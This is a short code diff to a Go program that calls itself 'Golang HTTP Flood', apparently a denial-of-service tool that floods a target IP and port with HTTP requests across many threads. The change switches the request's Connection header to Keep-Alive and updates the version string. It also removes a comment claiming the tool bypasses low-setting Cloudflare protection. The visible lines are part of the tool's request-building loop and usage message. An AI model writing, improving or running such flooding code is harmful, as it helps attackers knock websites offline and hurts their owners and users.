@@ -156,7 +156,7 @@ func flood(i int) {
         request += url2
         request += " HTTP/1.1\r\nHost: "
         request += ip 
-        request += "\r\nConnection: Close\r\n"//Can bypass low setting cloudflare website :)
+        request += "\r\nConnection: Keep-Alive\r\n"
         request += "User-Agent: "
         request += useragent
         request += "\r\n\r\n"
@@ -175,7 +175,7 @@ func flood(i int) {
 
 func main() {
     if len(os.Args) != 4 {
-        fmt.Println("Golang HTTP Flood (beta) v0.4")
+        fmt.Println("Golang HTTP Flood (beta) v0.5")
         fmt.Println("Usage: ",os.Args[0],"<ip> <port> <threads>")
         os.Exit(1)
     }
